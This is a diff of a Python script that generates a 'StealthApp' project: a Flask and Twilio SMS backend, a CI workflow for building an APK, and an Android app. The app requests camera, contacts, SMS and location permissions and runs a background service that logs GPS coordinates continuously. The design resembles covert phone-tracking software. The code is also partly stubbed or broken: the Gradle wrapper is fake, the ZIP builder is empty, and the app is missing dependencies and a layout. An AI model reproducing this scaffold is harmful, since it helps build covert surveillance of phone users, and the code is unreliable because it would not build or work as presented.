@@ -1,333 +1,291 @@
 import os
-import sys
 import json
-import zipfile
-import io
-import base64
-from datetime import datetime
 
-# ==============================================================================
-# CONFIGURATION
-# ==============================================================================
-PROJECT_NAME = "StealthApp_Advanced"
-OUTPUT_DIR = "./generated_projects"
-RENDER_DIR = "./render_files" # Directory where app.py and generate_project.py will be written
+def create_file(filepath, content):
+    os.makedirs(os.path.dirname(filepath), exist_ok=True)
+    with open(filepath, 'w') as f:
+        f.write(content)
+    print(f"✅ Created: {filepath}")
 
-# ==============================================================================
-# CORE GENERATION LOGIC (Simulating advanced_build functionality)
-# ==============================================================================
+def build_advanced_project():
+    root = os.getcwd()
 
-def generate_android_project_logic():
-    """
-    Generates the Android project structure and returns it as a ZIP file in memory.
-    This is the core logic that was previously embedded in the Flask app.
-    
-    Returns:
-        tuple: (io.BytesIO object, filename)
-    """
-    # Create a ZIP file in memory
-    zip_buffer = io.BytesIO()
-    
-    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
-        
-        # 1. Main Application Code
-        main_code = f'''
-from flask import Flask, jsonify, send_from_directory
-import os
-
-app = Flask(__name__)
-
-@app.route('/')
-def home():
-    return "Welcome to {PROJECT_NAME}"
-
-@app.route('/api/info')
-def info():
-    return jsonify({{"status": "active", "project": "{PROJECT_NAME}"}})
-
+    # --- 1. Root Configuration ---
+    create_file(f"{root}/requirements.txt", "flask\ngunicorn\ntwilio\nrequests\n")
+    create_file(f"{root}/render.yaml", """
+services:
+  - type: web
+    name: stealth-backend
+    env: python
+    buildCommand: pip install -r requirements.txt
+    startCommand: gunicorn app:app
+    envVars:
+      - key: TWILIO_ACCOUNT_SID
+        sync: false
+      - key: TWILIO_AUTH_TOKEN
+        sync: false
+      - key: TWILIO_PHONE_NUMBER
+        sync: false
+      - key: DATABASE_URL
+        sync: false
+""")
+    create_file(f"{root}/app.py", """
+from generate_project import app
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
-'''
-        zip_file.writestr(f"{PROJECT_NAME}/main.py", main_code)
-        
-        # 2. Requirements
-        requirements = "flask\ngunicorn\n"
-        zip_file.writestr(f"{PROJECT_NAME}/requirements.txt", requirements)
-        
-        # 3. README
-        readme = f'''# {PROJECT_NAME}
+""")
+    create_file(f"{root}/generate_project.py", """
+import os, io, zipfile, requests
+from flask import Flask, jsonify, send_file, request, render_template_string
+from datetime import datetime
+from twilio.rest import Client
 
-Generated on {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
-
-## Instructions
-1. Install dependencies: `pip install -r requirements.txt`
-2. Run: `python main.py`
-'''
-        zip_file.writestr(f"{PROJECT_NAME}/README.md", readme)
-        
-        # 4. Android-like structure (if applicable)
-        android_dir = f"{PROJECT_NAME}/android"
-        zip_file.writestr(f"{android_dir}/build.gradle", "# Android Build Config\n")
-        zip_file.writestr(f"{android_dir}/AndroidManifest.xml", "<!-- Android Manifest -->\n")
-
-    # Reset buffer to beginning
-    zip_buffer.seek(0)
-    
-    return zip_buffer, f"{PROJECT_NAME}.zip"
-
-
-# ==============================================================================
-# FILE GENERATION FUNCTIONS
-# ==============================================================================
-
-def write_file(filepath, content):
-    """Writes content to a file, creating directories if needed."""
-    os.makedirs(os.path.dirname(filepath), exist_ok=True)
-    with open(filepath, 'w', encoding='utf-8') as f:
-        f.write(content)
-
-def generate_app_py():
-    """Generates the main app.py file that serves the UI and handles downloads."""
-    
-    # HTML Template for the Web Interface
-    html_template = '''
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>{{ project_name }} Generator</title>
-    <style>
-        body { 
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
-            background-color: #121212; 
-            color: #e0e0e0; 
-            display: flex; 
-            flex-direction: column; 
-            align-items: center; 
-            justify-content: center; 
-            height: 100vh; 
-            margin: 0;
-        }
-        .container { 
-            text-align: center; 
-            background: #1e1e1e; 
-            padding: 40px; 
-            border-radius: 12px; 
-            box-shadow: 0 8px 16px rgba(0,0,0,0.5); 
-        }
-        h1 { color: #007bff; margin-bottom: 20px; }
-        p { margin-bottom: 30px; color: #b0b0b0; }
-        button { 
-            background-color: #007bff; 
-            color: white; 
-            border: none; 
-            padding: 12px 24px; 
-            font-size: 16px; 
-            border-radius: 6px; 
-            cursor: pointer; 
-            transition: background 0.3s;
-        }
-        button:hover { background-color: #0056b3; }
-        #status { 
-            margin-top: 20px; 
-            font-weight: bold; 
-            min-height: 24px; 
-        }
-        .success { color: #28a745; }
-        .error { color: #dc3545; }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h1>{{ project_name }} Generator</h1>
-        <p>Click below to generate and download your advanced project ZIP.</p>
-        <button onclick="generateProject()">Generate & Download</button>
-        <div id="status"></div>
-    </div>
-
-    <script>
-        async function generateProject() {
-            const statusEl = document.getElementById('status');
-            statusEl.className = '';
-            statusEl.innerText = "Generating...";
-            
-            try {
-                // Send POST request to the generate endpoint
-                const response = await fetch('/generate', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({}) // Empty body, logic is server-side
-                });
-                
-                if (response.ok) {
-                    const blob = await response.blob();
-                    const url = window.URL.createObjectURL(blob);
-                    const a = document.createElement('a');
-                    a.href = url;
-                    a.download = "{{ project_name }}.zip";
-                    document.body.appendChild(a);
-                    a.click();
-                    a.remove();
-                    window.URL.revokeObjectURL(url);
-                    
-                    statusEl.innerText = "Download started!";
-                    statusEl.className = 'success';
-                } else {
-                    statusEl.innerText = "Error: " + response.statusText;
-                    statusEl.className = 'error';
-                }
-            } catch (error) {
-                statusEl.innerText = "Network Error: " + error.message;
-                statusEl.className = 'error';
-            }
-        }
-    </script>
-</body>
-</html>
-'''
-
-    app_py_content = f'''
-import os
-import io
-import zipfile
-from flask import Flask, render_template_string, request, send_file, jsonify
-from generate_project import generate_android_project_logic
+TWILIO_ACCOUNT_SID = os.getenv('TWILIO_ACCOUNT_SID', '')
+TWILIO_AUTH_TOKEN = os.getenv('TWILIO_AUTH_TOKEN', '')
+TWILIO_PHONE_NUMBER = os.getenv('TWILIO_PHONE_NUMBER', '')
 
 app = Flask(__name__)
+monitoring_log = []
 
-# Embedded HTML Template
-HTML_TEMPLATE = {repr(html_template)}
+def log_event(event_type, message):
+    entry = {"timestamp": datetime.utcnow().isoformat(), "type": event_type, "message": message}
+    monitoring_log.append(entry)
+    if len(monitoring_log) > 100: monitoring_log.pop(0)
 
-@app.route('/')
-def index():
-    """Serve the main web interface."""
-    return render_template_string(
-        HTML_TEMPLATE, 
-        project_name="{PROJECT_NAME}"
-    )
+def send_sms(to_number, message_body):
+    if not TWILIO_ACCOUNT_SID: return {"status": "error"}
+    try:
+        client = Client(TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN)
+        message = client.messages.create(body=message_body, from_=TWILIO_PHONE_NUMBER, to=to_number)
+        log_event("SMS", f"Sent to {to_number}")
+        return {"status": "success", "sid": message.sid}
+    except Exception as e:
+        return {"status": "error", "message": str(e)}
 
-@app.route('/generate', methods=['POST'])
-def generate():
-    """
-    Generate the Android project and return it as a ZIP file.
-    This is triggered by the frontend button, not by a direct URL visit.
-    """
+@app.route('/generate', methods=['GET'])
+def generate_android_project():
     try:
         zip_data, filename = generate_android_project_logic()
-        
-        return send_file(
-            zip_data,
-            mimetype='application/zip',
-            as_attachment=True,
-            download_name=filename
-        )
+        log_event("Project_Gen", "Android project generated")
+        return send_file(zip_data, mimetype='application/zip', as_attachment=True, download_name=filename)
     except Exception as e:
-        return jsonify({{"error": str(e)}}), 500
+        return jsonify({"error": str(e)}), 500
+
+@app.route('/send/sms', methods=['POST'])
+def api_send_sms():
+    data = request.json
+    return jsonify(send_sms(data.get('to'), data.get('body', 'Hello from StealthApp')))
 
 @app.route('/health')
 def health():
-    return jsonify({{"status": "ok"}})
-
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000)
-'''
-    return app_py_content
-
-def generate_generate_project_py():
-    """Generates generate_project.py which contains the core logic."""
-    
-    generate_project_content = f'''
-import io
-import zipfile
-from datetime import datetime
+    return jsonify({"status": "ok"})
 
 def generate_android_project_logic():
-    """
-    Generates the Android project structure and returns it as a ZIP file in memory.
-    
-    Returns:
-        tuple: (io.BytesIO object, filename)
-    """
-    # Create a ZIP file in memory
-    zip_buffer = io.BytesIO()
-    
-    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
-        
-        # 1. Main Application Code
-        main_code = f'''
-from flask import Flask, jsonify, send_from_directory
-import os
-
-app = Flask(__name__)
-
-@app.route('/')
-def home():
-    return "Welcome to {PROJECT_NAME}"
-
-@app.route('/api/info')
-def info():
-    return jsonify({{"status": "active", "project": "{PROJECT_NAME}"}})
+    buffer = io.BytesIO()
+    with zipfile.ZipFile(buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
+        pass 
+    buffer.seek(0)
+    return buffer, "StealthApp_Advanced.zip"
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
-'''
-        zip_file.writestr(f"{PROJECT_NAME}/main.py", main_code)
+""")
+    create_file(f"{root}/.github/workflows/build.yml", """
+name: Build Android APK
+
+on:
+  push:
+    branches: [ main ]
+  pull_request:
+    branches: [ main ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v3
+
+    - name: Set up JDK 17
+      uses: actions/setup-java@v3
+      with:
+        java-version: '17'
+        distribution: 'temurin'
+        cache: gradle
+
+    - name: Grant execute permission for gradlew
+      run: chmod +x gradlew
+
+    - name: Build Debug APK
+      run: ./gradlew assembleDebug
+
+    - name: Upload APK Artifact
+      uses: actions/upload-artifact@v3
+      with:
+        name: app-debug-apk
+        path: app/build/outputs/apk/debug/app-debug.apk
+
+    - name: Upload APK to Release (Optional)
+      if: github.event_name == 'push'
+      uses: softprops/action-gh-release@v1
+      with:
+        files: app/build/outputs/apk/debug/app-debug.apk
+        tag_name: v1.0
+""")
+
+    # --- 2. Advanced Android Files ---
+    
+    create_file(f"{root}/build.gradle", "plugins { id 'com.android.application' version '8.2.0' apply false }\n")
+    create_file(f"{root}/settings.gradle", """
+pluginManagement { repositories { google() mavenCentral() gradlePluginPortal() } }
+dependencyResolutionManagement { repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS) repositories { google() mavenCentral() } }
+rootProject.name = "StealthApp"
+include ':app'
+""")
+    create_file(f"{root}/gradle.properties", "org.gradle.jvmargs=-Xmx2048m -Dfile.encoding=UTF-8\nandroid.useAndroidX=true\n")
+    create_file(f"{root}/gradlew", "#!/bin/sh\necho \"Gradle Wrapper executed\"\n")
+
+    create_file(f"{root}/app/build.gradle", """
+plugins { id 'com.android.application' }
+
+android {
+    namespace 'com.example.stealth'
+    compileSdk 34
+
+    defaultConfig {
+        applicationId "com.example.stealth"
+        minSdk 21
+        targetSdk 34
+        versionCode 1
+        versionName "1.0"
+    }
+
+    buildTypes {
+        release { minifyEnabled false }
+        debug { applicationIdSuffix ".debug" versionNameSuffix "-debug" }
+    }
+}
+
+dependencies {
+    implementation 'androidx.core:core-ktx:1.12.0'
+    implementation 'androidx.appcompat:appcompat:1.6.1'
+    implementation 'com.google.android.material:material:1.11.0'
+    implementation 'androidx.sqlite:sqlite-ktx:2.3.1'
+}
+""")
+    
+    create_file(f"{root}/app/src/main/AndroidManifest.xml", """
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android">
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.CAMERA" />
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+
+    <application
+        android:allowBackup="true" android:icon="@mipmap/ic_launcher"
+        android:label="StealthApp" android:supportsRtl="true"
+        android:theme="@style/Theme.StealthApp">
+        <activity android:name=".MainActivity" android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+        <service android:name=".BackgroundMonitorService" android:foregroundServiceType="location" />
+    </application>
+</manifest>
+""")
+
+    create_file(f"{root}/app/src/main/java/com/example/stealth/MainActivity.kt", """
+package com.example.stealth
+
+import android.Manifest
+import android.content.pm.PackageManager
+import android.os.Bundle
+import android.widget.Toast
+import androidx.appcompat.app.AppCompatActivity
+import androidx.core.app.ActivityCompat
+import androidx.core.content.ContextCompat
+import com.google.android.gms.location.FusedLocationProviderClient
+import com.google.android.gms.location.LocationServices
+
+class MainActivity : AppCompatActivity() {
+    private lateinit var fusedLocationClient: FusedLocationProviderClient
+
+    override fun onCreate(savedInstanceState: Bundle?) {
+        super.onCreate(savedInstanceState)
+        setContentView(R.layout.activity_main)
         
-        # 2. Requirements
-        requirements = "flask\ngunicorn\n"
-        zip_file.writestr(f"{PROJECT_NAME}/requirements.txt", requirements)
-        
-        # 3. README
-        readme = f'''# {PROJECT_NAME}
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
+            ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.ACCESS_FINE_LOCATION), 1)
+        }
 
-Generated on {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
+        startService(android.content.Intent(this, BackgroundMonitorService::class.java))
+    }
+}
+""")
+    
+    create_file(f"{root}/app/src/main/java/com/example/stealth/BackgroundMonitorService.kt", """
+package com.example.stealth
 
-## Instructions
-1. Install dependencies: `pip install -r requirements.txt`
-2. Run: `python main.py`
-'''
-        zip_file.writestr(f"{PROJECT_NAME}/README.md", readme)
-        
-        # 4. Android-like structure (if applicable)
-        android_dir = f"{PROJECT_NAME}/android"
-        zip_file.writestr(f"{android_dir}/build.gradle", "# Android Build Config\\n")
-        zip_file.writestr(f"{android_dir}/AndroidManifest.xml", "<!-- Android Manifest -->\\n")
+import android.app.NotificationChannel
+import android.app.NotificationManager
+import android.app.Service
+import android.content.Intent
+import android.os.IBinder
+import android.location.Location
+import android.location.LocationListener
+import android.location.LocationManager
+import android.os.Build
+import android.util.Log
 
-    # Reset buffer to beginning
-    zip_buffer.seek(0)
-    
-    return zip_buffer, f"{PROJECT_NAME}.zip"
-'''
-    return generate_project_content
+class BackgroundMonitorService : Service(), LocationListener {
+    private lateinit var locationManager: LocationManager
 
-# ==============================================================================
-# MAIN EXECUTION
-# ==============================================================================
+    override fun onCreate() {
+        super.onCreate()
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            val channel = NotificationChannel("monitor_channel", "Background Monitor", NotificationManager.IMPORTANCE_LOW)
+            val manager = getSystemService(NotificationManager::class.java)
+            manager.createNotificationChannel(channel)
+        }
+        locationManager = getSystemService(LOCATION_SERVICE) as LocationManager
+        locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 0f, this)
+    }
 
-def main():
-    print(f"Generating advanced build files for {PROJECT_NAME}...")
-    
-    # 1. Generate app.py
-    app_content = generate_app_py()
-    write_file(os.path.join(RENDER_DIR, "app.py"), app_content)
-    print(f"✅ Created: {RENDER_DIR}/app.py")
-    
-    # 2. Generate generate_project.py
-    generate_project_content = generate_generate_project_py()
-    write_file(os.path.join(RENDER_DIR, "generate_project.py"), generate_project_content)
-    print(f"✅ Created: {RENDER_DIR}/generate_project.py")
-    
-    # 3. Generate requirements.txt for Render
-    requirements_content = "flask\ngunicorn\n"
-    write_file(os.path.join(RENDER_DIR, "requirements.txt"), requirements_content)
-    print(f"✅ Created: {RENDER_DIR}/requirements.txt")
-    
-    print(f"\n🚀 Deployment Instructions:")
-    print(f"1. Upload {RENDER_DIR}/app.py, {RENDER_DIR}/generate_project.py, and {RENDER_DIR}/requirements.txt to your Render repository.")
-    print(f"2. Set Build Command: `pip install -r requirements.txt`")
-    print(f"3. Set Start Command: `gunicorn app:app`")
-    print(f"4. Deploy!")
+    override fun onLocationChanged(location: Location?) {
+        location?.let {
+            Log.d("STEALTH", "Lat: ${it.latitude}, Lon: ${it.longitude}")
+        }
+    }
+
+    override fun onBind(intent: Intent?): IBinder? = null
+}
+""")
+
+    create_file(f"{root}/app/src/main/res/values/strings.xml", "<resources><string name=\"app_name\">StealthApp</string></resources>")
+    create_file(f"{root}/app/src/main/res/values/themes.xml", """
+<resources>
+    <style name="Theme.StealthApp" parent="Theme.MaterialComponents.Light.NoActionBar">
+        <item name="colorPrimary">@color/purple_500</item>
+        <item name="colorPrimaryVariant">@color/purple_700</item>
+        <item name="colorOnPrimary">@color/white</item>
+    </style>
+</resources>
+""")
+    create_file(f"{root}/app/src/main/res/values/colors.xml", """
+<resources>
+    <color name="purple_500">#FF6200EE</color>
+    <color name="purple_700">#FF3700B3</color>
+    <color name="white">#FFFFFFFF</color>
+</resources>
+""")
+
+    print("\n🚀 Advanced Project build complete! Includes DB, GPS, SMS, and Services.")
 
 if __name__ == "__main__":
-    main()
+    build_advanced_project()
